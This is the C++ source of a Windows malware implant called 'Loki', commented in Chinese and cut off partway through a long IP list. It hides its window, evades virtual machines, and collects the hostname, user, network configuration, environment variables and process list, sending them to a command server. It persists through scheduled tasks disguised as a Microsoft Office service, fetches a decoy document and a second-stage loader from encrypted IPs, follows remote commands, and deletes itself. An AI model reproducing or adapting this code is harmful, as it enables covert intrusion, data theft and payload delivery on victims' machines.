// Loki.cpp : 定义控制台应用程序的入口点。
//

//#include <io.h>
//#include "direct.h"

#include<ctime>
#include <iostream>
#include <fstream>

#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <SDKDDKVer.h>
#include <string.h>
#include <stdio.h>
#include <direct.h>

#include "Common.h"
#include "HttpTools.h"
#include "TaskSchedule.h"
#include "Loki.h"
#include <random>



//test
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include <regex>


//#include <stdio.h>
#include <io.h>
//#include <string>

//#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

#ifndef _UNISTD_H
#define _UNISTD_H
#include <io.h>
#include <process.h>
#endif /* _UNISTD_H */
//

#include <iostream>

#include <string>

#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#include <windows.h>
#include <tchar.h>
#include <string>
#include <iostream>
#include "stdio.h"

#pragma comment(lib, "version.lib")

using namespace std;

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
#pragma comment(linker, "/INCREMENTAL:NO")

const unsigned int BLOCK_BYTES_LENGTH = 16 * sizeof(unsigned char);

string randstr(int max_length) {
	string possible_characters = "abcdefghijklmnopqrstuvwxyz";
	random_device rd;
	mt19937 engine(rd());
	uniform_int_distribution<> dist(0, possible_characters.size() - 1);
	string ret = "";
	for (int i = 0; i < max_length; i++) {
		int random_index = dist(engine); //get index between 0 and possible_characters.size()-1
		ret += possible_characters[random_index];
	}
	return ret;
}

void split(const string& s, vector<int>& sv, const char flag = ' ') {
	sv.clear();
	istringstream iss(s);
	string temp;

	while (getline(iss, temp, flag)) {
		sv.push_back(stoi(temp));
	}
	return;
}

void getDirFiles(string path, vector<string>& paths)
{
	intptr_t hFile = 0;
	struct _finddata_t fileinfo;
	string p;

	hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo);

	if (hFile != -1) {
		while (_findnext(hFile, &fileinfo) == 0) {
			if (fileinfo.attrib & _A_ARCH) {
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0) {
					paths.push_back(p.assign(path).append("\\").append(fileinfo.name));//保存文件名字
				}
			}
		}
	}
}

char dec2hexChar(short int n) {
	if (0 <= n && n <= 9) {
		return char(short('0') + n);
	}
	else if (10 <= n && n <= 15) {
		return char(short('A') + n - 10);
	}
	else {
		return char(0);
	}
}

short int hexChar2dec(char c) {
	if ('0' <= c && c <= '9') {
		return short(c - '0');
	}
	else if ('a' <= c && c <= 'f') {
		return (short(c - 'a') + 10);
	}
	else if ('A' <= c && c <= 'F') {
		return (short(c - 'A') + 10);
	}
	else {
		return -1;
	}
}

string escapeURL(const string& URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++) {
		char c = URL[i];
		if (
			('0' <= c && c <= '9') ||
			('a' <= c && c <= 'z') ||
			('A' <= c && c <= 'Z') ||
			c == '/' || c == '.'
			) {
			result += c;
		}
		else {
			int j = (short int)c;
			if (j < 0) {
				j += 256;
			}
			int i1, i0;
			i1 = j / 16;
			i0 = j - i1 * 16;
			result += '%';
			result += dec2hexChar(i1);
			result += dec2hexChar(i0);
		}
	}
	return result;
}


bool inSCRunning() 
{
	bool isScRunning = false;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		return 0;
	}
	PROCESSENTRY32 pi;
	pi.dwSize = sizeof(PROCESSENTRY32); //初始化成员
	BOOL bRet = Process32First(hSnapshot, &pi);
	while (bRet)
	{
		//
		regex scReg("^svchost[a-z]{3}");
		bool ret = regex_match(pi.szExeFile, scReg);
		if (ret)
		{
			isScRunning = true;
			break;
		}
		//printf("%s\r\n", pi.szExeFile);
		bRet = Process32Next(hSnapshot, &pi);
	}

	if (isScRunning)
	{
		return true;
	}
	else
	{
		return false;
	}
}

void svchostDel() 
{
	char* proPathTest;
	proPathTest = getenv("PROGRAMDATA");

	char temp[12] = "\\miarosoft\\";

	char* t = new char[strlen(proPathTest) + strlen(temp)];    //先分配一块足够的空间
	strcpy(t, proPathTest);   //然后把p复制进去
	strcat(t, temp);   //再把a添加到后面
	proPathTest = t;  //最后再赋值给p

	vector<string> paths;
	getDirFiles(proPathTest, paths);

	for (int i = 0; i < paths.size(); i++) {
		//cout << paths.at(i) << endl;

		string::size_type fret = paths.at(i).find("svchost");

		if (fret != string::npos)
		{

			try
			{
				remove(paths.at(i).c_str());
				printf("[+] %s delete success\n", paths.at(i).c_str());
			}
			catch (exception e)
			{
				Common::logReport(e.what());
			}
		}
	}
}

void conhostDel()
{
	char* proPathTest;
	proPathTest = getenv("PROGRAMDATA");

	char temp[12] = "\\miarosoft\\";

	char* t = new char[strlen(proPathTest) + strlen(temp)];    //先分配一块足够的空间
	strcpy(t, proPathTest);   //然后把p复制进去
	strcat(t, temp);   //再把a添加到后面
	proPathTest = t;  //最后再赋值给p

	vector<string> paths;
	getDirFiles(proPathTest, paths);

	for (int i = 0; i < paths.size(); i++) {
		//cout << paths.at(i) << endl;

		string::size_type fret = paths.at(i).find("conhost");

		if (fret != string::npos)
		{

			try
			{
				remove(paths.at(i).c_str());
				printf("[+] %s delete success\n", paths.at(i).c_str());
			}
			catch (exception e)
			{
				Common::logReport(e.what());
			}
		}
	}
}


//test1

//向指定文件写入文本。如果文件不存在就创建。
int WriteTextToFile(const char szFileName[], const char* lpszText)
{
	FILE* pfile = fopen(szFileName, "w+");
	if (pfile == NULL)
		return -1;
	int nWriteByte = fprintf(pfile, lpszText);
	fclose(pfile);
	return nWriteByte;
}

static const char tempbatname[] = "hw_stop.bat";

void selfDel()
{
	// temporary .bat file
	static char templ[] =
		":Repeat\r\n"
		"del \"%s\"\r\n"
		"if exist \"%s\" goto Repeat\r\n"
		"rmdir \"%s\"\r\n"
		"del \"%s\"";


	char modulename[_MAX_PATH];    // absolute path of calling .exe file
	char temppath[_MAX_PATH];      // absolute path of temporary .bat file
	char folder[_MAX_PATH];

	GetTempPath(_MAX_PATH, temppath);
	strcat(temppath, tempbatname);

	GetModuleFileName(NULL, modulename, MAX_PATH);
	strcpy(folder, modulename);
	char* pb = strrchr(folder, '\\');
	if (pb != NULL)
		*pb = 0;

	HANDLE hf;

	hf = CreateFile(temppath, GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hf != INVALID_HANDLE_VALUE)
	{
		DWORD len;
		char* bat;

		bat = (char*)alloca(strlen(templ) +
			strlen(modulename) * 2 + strlen(temppath) + 20);

		wsprintf(bat, templ, modulename, modulename, folder, temppath);

		WriteFile(hf, bat, strlen(bat), &len, NULL);
		CloseHandle(hf);

		ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
	}
}

//test1







int main(int argc, _TCHAR* argv[])
{
	string randstrStart = "sdfffffffffffffffffffffffffsdfsdfsdfsdfsdfsd";
	cout << randstrStart << endl;
	char* taskname1 = "Office Log Service Monitor";
	char* taskname2 = "Office Log Service Monitor mini";

	//string cdnHost = "filelist691.wzysoft.com";
	//string cdnHostEnc = "bbyFSvnDdWXI2TWf2hDyLM/6yrB5aMChNvQdbHh5lTs=";
	string cdnHostEnc = "8gGmJsqoapchXTFrVsqimb2Op82Nw3B8E9qZX9z/Yac=";

	string cdnHost = Common::aesDecrypt(cdnHostEnc);

	//cout << cdnHost << endl;

	char* tempPath;
	tempPath = getenv("TEMP");

	char* WorkPath;
	WorkPath = getenv("PROGRAMDATA");

	//conhostDel();

	//selfDel();


	//开启反虚拟机
	Common::antVirtual(TRUE);

	


	//system("pause");

	//test

	//string test = "";
	//printf("\n%s\n",test.length());


	//system("pause");
	//test

	//ShowWindow(GetForegroundWindow(), 0);//隐藏本程序顶层窗体

	//获取hostname，发送时需转为char
	string hostnameraw = Common::getHostname();
	string hostname2 = escapeURL(hostnameraw.c_str());
	string hostname = curl_escape(hostname2.c_str(), hostname2.size());
	printf("[+] hostname: %s\n", hostname2.c_str());

	//string test = curl_escape(hostname.c_str(), hostname.size());
	//printf("[+] hostname: %s\n", test.c_str());

	//system("pause");



	//获取当前用户名
	CHAR cUserNameBuffer1[256];
	DWORD dwUserNameSize = 256;
	GetUserName(cUserNameBuffer1, &dwUserNameSize);
	printf("[+] username: %s\n", cUserNameBuffer1);

	string cUserNameBuffer2 = escapeURL(cUserNameBuffer1);
	string cUserNameBuffer = curl_escape(cUserNameBuffer2.c_str(),cUserNameBuffer2.size());



	//获取架构信息
	string arch;
	if (Common::is64bitSystem()) 
	{
		arch.append("x64");
	}
	else
	{
		arch.append("x86");
	}
	printf("[+] arch: %s\n",arch);


	//获取Donet信息
	string allDonetVers = Common::getNetAllVersions();
	printf("[+] donets: %s\n", allDonetVers.c_str());

	//获取网络配置信息
	string cmdRes = Common::ExeCmd("cmd /c ipconfig");
	string ipconfigEncoded = escapeURL(base64_encode(reinterpret_cast<const unsigned char*>(cmdRes.c_str()), cmdRes.length()));
	//string decoded = base64_decode(ipconfigEncoded);
	//printf("[+] ipconfig: %s\n", cmdRes.c_str());
	printf("[+] ipconfig: %s\n", ipconfigEncoded.c_str());

	//获取IE代理配置信息
	string ieProxyConfig = Common::getIEProxy();
	printf("[+] ieProxyConfig: %s\n", ieProxyConfig.c_str());

	//获取环境配置信息
	string envRes = Common::ExeCmd("cmd /c set");
	//printf("[+] envRes: %s\n", envRes.c_str());
	string envEncoded = escapeURL(base64_encode(reinterpret_cast<const unsigned char*>(envRes.c_str()), envRes.length()));
	//string decoded = base64_decode(ipconfigEncoded);
	printf("[+] env: %s\n", envEncoded.c_str());

	//获取tasklist

	//string processRes = Common::ExeCmd("cmd /c tasklist");
	string processRes = Common::getProcessList();
	//printf("[+] processRes: %s\n", processRes.c_str());
	string processEncoded = escapeURL(base64_encode(reinterpret_cast<const unsigned char*>(processRes.c_str()), processRes.length()));
	//string decoded = base64_decode(processEncoded);
	printf("[+] process: %s\n", processEncoded.c_str());

	//char init[1024] = "";
	//sprintf(init, "action=init&hostname=%s&user=%s&arch=%s&dotnet=%s&network=%s&proxy=%s&env=%s&process=%s", hostname.c_str(), cUserNameBuffer, arch, allDonetVers.c_str(), ipconfigEncoded.c_str(), ieProxyConfig.c_str(), envEncoded.c_str(), processEncoded.c_str());
	//memset(init, 0, sizeof(init));


	ostringstream init;
	init << "action=init&hostname=" << hostname << "&user=" << cUserNameBuffer << "&arch=" << arch << "&dotnet=" << allDonetVers << "&network=" << ipconfigEncoded << "&proxy=" << ieProxyConfig << "&env=" << envEncoded << "&process=" << processEncoded << endl;
	string initData = init.str();

	cout << init.str().c_str();

	//printf("=================================\n");
	//printf("[+]init %s", init.str().c_str());
	//printf("=================================\n");


	//string resp = HttpTools::HttpPost("http://182.92.116.44/?c=client&a=report", initData, 20);

	//printf("[+] resp:%s\n", resp);

	//string proxyConfig = Common::getIEProxy();
	//if (proxyConfig != "ProxynotEnabled")
	//{
	//	string proxyServer = "http://";
	//	proxyServer.append(proxyConfig);
	//	printf("[+] %s\n",proxyServer.c_str());
	//}

	//system("pause");


	//std::cout << "decoded: " << decoded << std::endl;

	//string str = base64_encode(cmdRes,block_num * BLOCK_SIZE);

	//Code Test Area Start

	//re:^svchost[a-z]{3}


	//0 成功， 1 失败

	//system("pause");

	//system("pause");


	//Code Test Area End

	try
	{
		printf("\n=======================1=================\n");
		string resp = Common::baseInfoReport(initData.c_str());
		

		printf("\n=======================2=================\n");

		bool isAdmin = Common::isAdmin();

		//baseInfo Area
		int iplength = sizeof(ips_enc) / sizeof(ips_enc[0]);

		printf("\n=======================3=================\n");


		printf("[+] Check Virtual Succcess\n");

		//路径检测
		string CurrentPath = argv[0];

		char DesPath[128];
		sprintf(DesPath, "%s\\Miarosoft", WorkPath);


		//创建路径（创建前有清空源文件夹）
		Common::createDir(DesPath);

		//生成随机文件名

		string DesFileName1;
		DesFileName1.append(DesPath);
		DesFileName1.append("\\conhost");
		DesFileName1.append(randstr(3));


		//srand(time(NULL));g
		//char name[LEN_NAME + 1];
		//sprintf(DesFileName, "%s\\%s.exe", DesPath, rand_str(name, LEN_NAME));

		ostringstream nowpath;
		nowpath << "action=init&hostname=" << hostname << "&content=" << cUserNameBuffer << endl;
		
		//string nowpathData = nowpath.str();

		//string resp = HttpTools::HttpPost("http://182.92.116.44/?c=client&a=report", argv[0], 20);

		string xxxa = argv[0];
		string nowFilename = curl_escape(xxxa.c_str(), xxxa.size());

		Common::logReport(nowFilename.c_str());


		//判断当前路径是否在目标文件夹
		if (strstr(CurrentPath.c_str(), DesPath) == NULL) {

			//Common::logReport(argv[0]);

			conhostDel();

			if (CopyFile(argv[0], DesFileName1.c_str(), FALSE)) 
			{
				Common::logReport("Copy To ProgramData Dir Success");
			}

			

			//追加时间戳
			//Common::addTimestamp(DesFileName1.c_str());

			CMyTaskSchedule task;
			BOOL flag = FALSE;

			char* chr = const_cast<char*>(DesFileName1.c_str());

			flag = task.NewTask(taskname1, chr, "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

			if (FALSE == flag)
			{
				printf("\n[-] Create %s Task Schedule Error!\n", DesFileName1.c_str());
				Common::logReport("Schedule Task Of Loki Create Error");
				//chdir(DesPath);
				//string exeFile1 = DesFileName1.append(".exe");
				//cout << exeFile1 << endl;
				//cout << DesFileName1 << endl;
				CopyFile(argv[0], DesFileName1.append(".exe").c_str(), FALSE);//false代表覆盖，dutrue不覆盖
				cout << DesFileName1 << endl;
				Common::exec(DesFileName1.c_str(), FALSE);
				//system("pause");
			}
			else {
				printf("\n[+] Create %s Task Schedule Success!\n", DesFileName1.c_str());
				Common::logReport("Schedule Task Of Loki Create Success");
			}


			//开始加载远程文件

			//读取文件属性
			string docfile =  Common::GetFileVersion(argv[0]);

			if (docfile != "")
			{

				Common::logReport(docfile.c_str());

				//cout << "[+] lastname: " << lastLine << '\n';     // Display it

				//https://filelist691.wzysoft.com/?c=client&a=payload&type=fakefile&name=xxxxx


				//string cdnHost = "filelist691.wzysoft.com";

				//printf("\n[+] %s \n", doc_url.c_str());
				//printf("\n[+] %s \n", doc_file.c_str());
				//printf("\n[+] %s \n", cdnHost.c_str());

				string doc_file = "";
				doc_file.append(tempPath);
				doc_file.append("\\");

				printf("\n[+] %s \n", doc_file.c_str());

				string docDownFlag = "";

				string doc_url = "https://";

				//doc_url.append("filelist691.wzysoft.com");

				srand((unsigned)time(NULL));
				string ip = Common::aesDecrypt(ips_enc[(rand() % (iplength + 1))]);

				doc_url.append(ip);


				doc_url.append("/?c=client&a=payload&type=fakefile&name=");
				//doc_url.append("qianxin");
				doc_url.append(docfile);



				printf("\n[+] %s \n", doc_url.c_str());

				try
				{
					docDownFlag = HttpTools::download_office_file(doc_url.c_str(), doc_file.c_str());
				}
				catch (exception e)
				{
					Common::logReport(e.what());
					Common::logReport("Office File Download Error");
				}



				//Common::logReport("");

				cout << "Flag:" << docDownFlag.c_str() << endl;

				//system("pause");

				if (docDownFlag == "error") {
					printf("\n[+] Office File Download Error!\n");
					Common::logReport("Office File Download Error");
					//exit(42);
				}


				//system("start C:\\Users\\ateam\\AppData\\Local\\Temp\\3\\testfile.pdf");
				string doc_cmd = "C:\\Windows\\System32\\cmd.exe /c start ";
				doc_file.append(docDownFlag);
				doc_cmd.append(doc_file);

				//Common::logReport(doc_file.c_str());

				printf("\n[+] %s\n", chr);

				if (!access(doc_file.c_str(), 0))
				{
					printf("\n[+] %s\n", doc_cmd.c_str());
					char* chr = strdup(doc_cmd.c_str());
					//free(chr);
					//printf("\n[+] %s\n", chr);
					Common::ExeCmd(chr);
					Common::logReport("Office File Start Success");
				}
				else
				{
					printf("\n[+] Office file not exist\n");
					Common::logReport("Office File Download Error2");
					//exit(42);
				}

			}

			//system("pause");


			//

			exit(0);
		}

		else
		{
			try
			{
				printf("\n[+] C++ Sch %s Run Success!\n", CurrentPath.c_str());

				Common::logReport("Task Schedule Of Loki Run Success");

				//string resp = HttpTools::HttpPost("http://182.92.116.44/?c=client&a=report", initData, 20);

				

				//system("pause");

				printf("[+] resp:%s\n", resp);

				if (resp == "ok")
				{
					if (inSCRunning())
					{
						printf("[+] SCloader Is Running\n");
						Common::logReport("SCloader Is Running");
					}
					else 
					{
						printf("[+] SCloader Is Not Running\n");
						Common::logReport("SCloader Is Not Running");
					}

					//system("pause");
					//exit(0);
				}
				else if (resp == "redownload")
				{
					svchostDel();
					for (int i = 0; i < 30; i++) {
						srand((unsigned)time(NULL));
						try
						{
							string url = "https://";
							srand((unsigned)time(NULL));
							string ip = Common::aesDecrypt(ips_enc[(rand() % (iplength + 1))]);

							url.append(ip);
							//url.append("182.92.116.44");
								//url.append("/static/CLR/CLR_x64.exe");
							

							if (Common::is64bitSystem()) {
								url.append("/?c=client&a=payload&type=loader&arch=x64&hostname=");
							}
							else
							{
								url.append("/?c=client&a=payload&type=loader&arch=x86&hostname=");
							}


							//获取hostname，发送时需转为char
							string hostnameraw1 = Common::getHostname();
							string hostname21 = escapeURL(hostnameraw1.c_str());
							string hostname333 = curl_escape(hostname21.c_str(), hostname21.size());
							printf("[+] hostname: %s\n", hostname21.c_str());

							url.append(hostname333);

							const char* targetUrl = url.c_str();

							printf("\n[+] Download Url: %s\n", targetUrl);

							//system("pause");


							//生成随机文件名



							//生成随机的CLR马儿的名称



							//char DesPath[128];
							//sprintf(DesPath, "%s\\Miarosoft", WorkPath);


							//string botFile1;
							//botFile1.append(tempPath);
							//botFile1.append("\\svchost");
							//srand(time(NULL));
							//char namea[3];
							//memset(namea, 0, sizeof(namea));
							//char* temp = randstr(namea, 3);
							//std::string str(temp);
							//botFile1.append(temp);


							string botFile1;
							//botFile1.append(tempPath);
							botFile1.append(DesPath);
							botFile1.append("\\svchost");
							botFile1.append(randstr(3));
							//srand(time(NULL));
							//char* temp2 = randstr(name2, 3);
							//std::string str4(temp2);
							//botFile1.append(temp2);



							//botFile1.append(".exe");
							//botFile1.append(".exe");

							printf("\n[+] Local Path %s\n", botFile1.c_str());

							Common::logReport(targetUrl);


							//下载木马
							//string cdnHost2 = "182.92.116.44";
							//string cdnHost2 = "filelist691.wzysoft.com";
							int downFlag = -1;
							try
							{
								downFlag = HttpTools::download_file(targetUrl, botFile1.c_str(), cdnHost.c_str());
							}
							catch (exception e)
							{
								Common::logReport(e.what());
								downFlag = -1;
								//Common::logReport("Loader Download Error");
							}

							//Common::logReport("");

							if (downFlag < 0) {

								printf("\n[+] C++ Download Error!\n");
								Common::logReport("Loader Download Error");
							}
							else
							{
								//svchostDel();
								char* chr2 = const_cast<char*>(botFile1.c_str());

								printf("\n[+] %s Download Success!\n", botFile1.c_str());
								Common::logReport("Loader Download Success");

								//追加时间戳
								//Common::addTimestamp(botFile1.c_str());

								CMyTaskSchedule task2;
								BOOL flag2 = FALSE;

								//system("pause");

								flag2 = task2.NewTask("Office Log Service Monitor mini", chr2, "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

								if (FALSE == flag2)
								{
									printf("\n[-] Create %s Task Schedule Error!\n", botFile1.c_str());

									Common::logReport("Schedule Task Of Loader Create Error");

									cout << chr2 << endl;

								
									string testFile;
									testFile.append(botFile1);
									testFile.append(".exe");

									if (CopyFile(botFile1.c_str(), testFile.c_str(), FALSE))
									{
										cout << "copy success" << endl;
									}

									cout << botFile1 << endl;
									Common::logReport("trying run loader in cmd");

									Common::exec(botFile1.c_str(), FALSE);
									exit(0);


								}
								else {
									printf("\n[+] Create %s Task Schedule Success!\n", botFile1.c_str());

									Common::logReport("Schedule Task Of Loader Create Success");
									//system("pause");
									exit(0);
								}
								break;

								//cout << "================================" << size << endl;
								//Sleep(100000);




							}
						}
						catch (exception e)
						{
							Common::logReport(e.what());
							exit(0);
						}

					}
				}else if (resp == "clear_loader") {

					//删除loader的计划任务
					CMyTaskSchedule loaderdel;
					loaderdel.Delete(taskname2);
					svchostDel();
					Common::logReport("Loader Clear Success");

				}else if (resp == "clear_loki") {
					CMyTaskSchedule lokidel;
					lokidel.Delete(taskname1);
					conhostDel();
					Common::logReport("Loki Clear Success");
					selfDel();
				}
				//预留执行命令
				//else {
				//	string cmdRes = Common::ExeCmd(resp);
				//	Common::logReport(cmdRes.c_str());
				//}
				exit(0);


				//CoolCat


					/// <summary>
					/// 加进程检测
					/// </summary>
					/// <param name="argc"></param>
					/// <param name="argv"></param>
					/// <returns></returns>


				
			}
			catch (exception e)
			{
				Common::logReport(e.what());
				exit(0);
			}
			

			//srand((unsigned)time(NULL));
			//for (int i = 0; i < 30; i++) {

			//	string url = "https://";

			//	string ip = Common::aesDecrypt(ips_enc[(rand() % (iplength + 1))]);

			//	//cout << ip << "\n";

			//	url.append(ip);
			//	//url.append("/static/CLR/CLR_x64.exe");
			//	url.append("/static/CLR/1.exe");
			//	const char* targetUrl = url.c_str();

			//	printf("[+] Download Url: %s\n", targetUrl);

			//	//system("pause");


			//	//生成随机文件名


			//	srand(time(NULL));
			//	char name3[LEN_NAME + 1];

			//	//生成随机的CLR马儿的名称
			//	char botFile[80];
			//	strcpy(botFile, "C:/Windows/Temp/");
			//	strcat(botFile, rand_str(name3, LEN_NAME));
			//	strcat(botFile, ".exe");

			//	printf("[+] Local Path %s\n", botFile);

			//	//下载木马
			//	int downFlag = HttpTools::download_file(targetUrl, botFile, cdnHost.c_str());

			//	if (downFlag < 0) {
			//		printf("[+] C++ Download Error!\n");
			//	}
			//	else
			//	{
			//		printf("[+] %s Download Success!\n", botFile);

			//		//追加时间戳
			//		Common::addTimestamp(botFile);

			//		CMyTaskSchedule task2;
			//		BOOL flag2 = FALSE;

			//		//system("pause");

			//		flag2 = task2.NewTask("Office Service Monitor2", botFile, "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

			//		if (FALSE == flag2)
			//		{
			//			printf("[-] Create %s Task Schedule Error!\n", botFile);
			//			Common::exec(botFile, FALSE);
			//		}
			//		else {
			//			printf("[+] Create %s Task Schedule Success!\n", botFile);
			//		}
			//		break;
			//	}

			//}


			//vector<string> line = { "1.180.27.205","1.180.27.218","1.180.27.251","1.180.27.240","1.180.27.216","1.180.27.206","1.180.27.217","1.180.27.204","1.180.27.254","1.180.27.250","1.180.27.219","1.180.27.253","1.180.27.207","1.180.27.241","1.180.31.230","1.180.31.234","1.180.31.235","1.180.31.236","1.180.31.225","1.180.31.224","1.180.31.237","1.180.31.231","1.180.31.232","1.180.31.233","1.189.219.113","1.189.219.104","1.189.219.110","1.189.219.103","1.189.219.111","1.189.219.114","1.189.219.179","1.189.219.178","1.189.219.182","1.189.219.184","1.189.219.183","1.189.219.187","1.189.219.188","1.189.219.185","1.189.219.116","1.189.219.115","1.189.219.207","1.189.219.196","1.189.219.208","1.189.219.195","1.189.219.209","1.189.219.210","1.189.219.214","1.189.219.251","1.189.219.213","1.189.219.254","1.189.219.244","1.189.219.212","1.189.219.243","1.189.219.252","1.189.99.110","1.189.99.118","1.189.99.248","1.189.99.250","1.189.99.244","1.189.99.172","1.189.99.251","1.189.99.252","1.189.99.89","1.189.99.88","1.190.42.179","1.190.42.200","1.190.42.177","1.189.99.111","1.189.99.117","1.190.42.178","1.189.99.249","1.190.42.176","1.189.99.87","1.189.99.86","1.189.99.171","1.190.42.211","1.190.42.213","1.190.42.212","1.190.42.216","1.190.42.217","1.190.42.241","1.190.42.218","1.190.42.219","1.190.42.240","1.190.42.251","1.190.42.248","1.193.146.237","1.193.146.232","1.193.146.234","1.190.42.252","1.190.42.249","1.193.146.230","1.193.146.236","1.193.146.231","1.193.146.233","1.193.217.121","1.193.218.102","1.193.218.112","1.193.218.103","1.193.218.113","1.193.218.118","1.193.218.76","1.193.218.56","1.193.218.78","1.193.218.82","1.193.218.77","1.193.218.79","1.193.218.81","1.193.218.95","1.193.218.87","1.193.218.84","1.199.92.113","1.199.92.112","1.193.217.123","1.199.92.24","1.193.217.120","1.199.92.48","1.199.92.42","1.199.92.44","1.199.92.79","1.199.92.60","1.199.92.80","1.199.92.92","1.199.92.91","1.24.81.112","1.24.81.119","1.24.81.120","1.24.81.113","1.199.92.96","1.24.81.122","1.24.81.123","1.24.81.92","1.24.81.95","1.27.242.122","1.27.242.123","1.28.145.251","1.28.145.222","1.28.145.223","1.28.145.239","1.28.145.238","1.28.145.249","1.28.145.248","1.28.145.252","1.56.130.174","1.56.130.172","1.56.130.170","1.56.130.169","1.56.130.176","1.56.130.200","1.56.130.173","1.56.130.175","1.56.130.192","1.56.130.187","1.56.130.171","1.56.130.201","1.56.130.199","1.56.130.223","1.56.130.224","1.56.130.231","1.56.130.234","1.56.130.236","1.56.130.230","1.56.130.188","1.56.130.233","1.56.130.202","1.56.130.235","1.56.130.191","1.56.96.107","1.56.96.105","1.56.96.110","1.56.96.109","1.56.96.106","1.56.96.108","1.56.96.111","1.56.96.112","1.71.144.233","1.71.144.236","1.71.144.234","1.71.144.235","1.71.145.235","1.71.145.230","1.71.145.233","1.71.145.234","1.71.145.237","1.71.145.231","1.71.145.232","1.71.145.236","1.71.146.232","1.71.146.231","1.71.146.237","1.71.146.236","1.71.146.230","1.71.146.235","1.71.146.234","1.71.146.233","1.71.147.213","1.71.147.211","1.71.147.234","1.71.147.236","1.71.147.235","1.71.147.232","1.71.147.230","1.71.147.237","1.71.147.231","1.71.147.233","1.71.147.212","1.71.147.214","1.71.154.236","1.71.154.235","1.81.0.14","1.81.0.13","1.81.0.20","1.71.154.234","1.71.154.233","1.81.0.17","1.81.0.19","1.81.0.15","1.81.0.18","1.81.0.16","1.81.1.182","1.81.1.181","1.81.1.190","1.81.1.191","1.81.1.218","1.81.1.219","1.81.1.243","1.81.1.238","1.81.1.249","1.81.1.237","1.81.1.244","1.81.1.248","1.81.1.253","1.81.1.246","1.81.1.254","101.206.189.226","101.206.189.228","1.81.1.250","101.206.212.166","101.206.212.168","101.206.212.169","101.206.212.167","101.206.212.175","101.206.212.163","101.206.212.151","101.206.212.152","101.206.212.174","101.206.212.188","101.206.212.162","101.206.212.189","101.206.212.190","101.206.212.191","101.206.212.216","101.206.212.200","101.206.212.215","101.206.212.201","101.206.212.233","101.206.212.234","101.206.212.244","101.206.212.243","101.206.212.240","101.206.212.241","101.207.252.169","101.207.252.176","101.207.252.177","101.207.252.180","101.207.252.170","101.207.252.179","101.207.252.250","101.226.26.183","101.207.252.249","101.226.26.184","101.207.252.244","101.226.26.185","101.207.252.248","101.226.26.186","101.207.252.195","101.207.252.97","101.207.252.243","101.207.252.242","101.226.26.188","101.226.26.187","101.226.26.216","101.226.26.217","101.226.26.218","101.226.26.219","101.226.26.240","101.226.26.241","101.226.26.250","101.226.26.251","101.226.26.253","101.226.26.254","101.226.27.168","101.226.27.167","101.226.27.176","101.226.27.174","101.226.27.178","101.226.27.175","101.226.27.181","101.226.27.177","101.226.27.198","101.226.27.173","101.226.27.197","101.226.27.218","101.226.27.217","101.226.27.216","101.226.27.241","101.226.27.254","101.226.27.240","101.226.27.250","101.226.27.251","101.226.27.253","101.226.27.219","101.226.28.193","101.226.28.197","101.226.28.194","101.226.28.192","101.226.28.198","101.226.28.191","101.226.28.217","101.226.28.216","101.226.28.219","101.226.28.241","101.226.28.240","101.226.28.250","101.226.28.251","101.226.28.253","101.226.28.254","101.226.27.182","101.227.0.146","101.227.0.148","101.227.0.142","101.227.0.143","101.227.0.147","101.227.0.141","101.227.0.145","101.227.0.144","101.226.28.218","101.227.24.174","101.227.24.177","101.227.24.180","101.227.24.183","101.227.24.179","101.227.24.184","101.227.24.178","101.227.24.199","101.227.24.198","101.227.24.214","101.227.24.215","101.227.24.216","101.227.24.238","101.227.24.217","101.227.24.252","101.227.24.251","101.227.24.239","101.227.24.249","101.227.24.248","101.227.25.214","101.227.25.213","101.227.25.231","101.227.25.234","101.227.25.233","101.227.25.236","101.227.25.237","101.227.25.232","101.227.25.230","101.227.25.235","101.28.128.109","101.28.128.107","101.227.33.237","101.28.128.108","101.28.128.106","101.28.128.101","101.227.33.230","101.227.33.233","101.227.33.235","101.28.128.103","101.227.33.231","101.28.128.100","101.28.128.102","101.28.128.110","101.227.33.236","101.227.33.232","101.28.128.112","101.28.128.113","101.28.128.111","101.227.33.234","101.28.128.96","101.28.128.97","101.28.132.100","101.28.128.99","101.28.132.104","101.28.128.98","101.28.132.101","101.28.132.102","101.28.132.103","101.28.132.105","101.28.132.111","101.28.132.109","101.28.132.108","101.28.132.112","101.28.132.99","101.28.132.80","101.28.132.75","101.28.133.122","101.28.133.121","101.28.133.117","101.28.132.114","101.28.133.120","101.28.133.116","101.28.133.125","101.28.132.110","101.28.132.115","101.28.132.98","101.28.133.109","101.28.133.119","101.28.133.110","101.28.133.75","101.28.133.63","101.28.133.76","101.28.133.65","101.28.133.64","101.28.133.90","101.28.133.77","101.28.133.89","101.28.133.88","101.28.133.91","101.37.183.140","101.37.183.141","101.37.183.176","101.37.183.177","101.37.183.183","101.37.183.187","101.37.183.184","101.37.183.186","101.71.105.112","101.71.105.138","101.71.105.111","101.71.105.143","101.71.105.144","101.71.105.137","101.71.105.165","101.71.105.166","101.71.105.167","101.28.133.78","101.71.105.168","101.71.105.173","101.71.105.174","101.71.105.180","101.71.105.179","101.71.105.192","101.71.105.191","101.71.105.189","101.71.105.240","101.71.105.241","101.71.105.251","101.71.105.215","101.71.105.250","101.71.105.254","101.71.105.253","101.71.105.216","101.72.202.137","101.72.202.138","101.72.202.135","101.72.202.136","101.72.202.168","101.72.202.167","101.72.202.181","101.72.202.182","101.72.202.184","101.72.202.183","101.72.202.202","101.72.202.201","101.72.202.206","101.72.202.192","101.72.202.203","101.72.202.204","101.72.202.225","101.72.202.226","101.72.202.191","101.72.202.236","101.72.202.235","101.72.202.232","101.72.202.233","101.7